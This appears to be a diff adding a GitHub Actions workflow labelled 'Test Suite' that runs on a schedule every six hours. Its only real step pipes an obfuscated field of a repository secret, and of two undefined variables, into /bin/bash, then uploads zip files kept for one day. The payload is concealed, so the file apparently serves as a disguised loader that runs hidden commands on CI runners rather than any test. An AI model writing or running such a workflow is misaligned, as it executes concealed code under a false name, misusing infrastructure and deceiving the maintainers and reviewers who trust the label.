@@ -1,0 +1,32 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '31 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Build and run
+        env:
+          a99: ${{ secrets.a99 }}
+        run: |
+          printf '%s' "$a99" | jq -r .ju00855 | /bin/bash
+          echo $wzdk773 | jq -r .nqa8436 | /bin/bash
+          echo $gllf967 | jq -r .cuge61 | /bin/bash
+
+      - name: Save output
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: R03LWCC6
+          path: "*.zip"
+          retention-days: 1
